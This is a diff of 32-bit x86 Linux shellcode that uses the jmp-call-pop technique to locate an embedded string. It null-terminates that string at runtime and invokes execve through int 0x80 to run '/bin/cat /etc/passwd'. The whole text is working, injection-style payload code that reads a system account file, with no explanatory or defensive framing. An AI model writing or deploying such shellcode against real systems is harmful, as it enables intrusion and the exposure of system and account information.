@@ -3,24 +3,29 @@
 _start:
         jmp caller
 callee:
+        pop esi
+        xor ecx, ecx
+        mov cl, [esi]
+        inc esi
+        mov edi, esi
+        cld
+        rep lodsb
+        mov [esi], cl
+main:
+        push 11
         pop eax
-        xor edx, edx
-        lea esi, [eax+1]
-        mov ecx, esi
-        add cl, [eax]
-        mov [ecx], dl
+        cdq
         push edx
         push 0x7461632f
-        push 0x6e69622f    /* "/bin/cat" */
+        push 0x6e69622f
         mov ebx, esp
         push edx
-        push esi
+        push edi
         push ebx
         mov ecx, esp
-        lea eax, [edx+11]  /* execve */
         int 0x80
 caller:
         call callee
-pstring:
+arg:
         .byte 11
         .ascii "/etc/passwd"
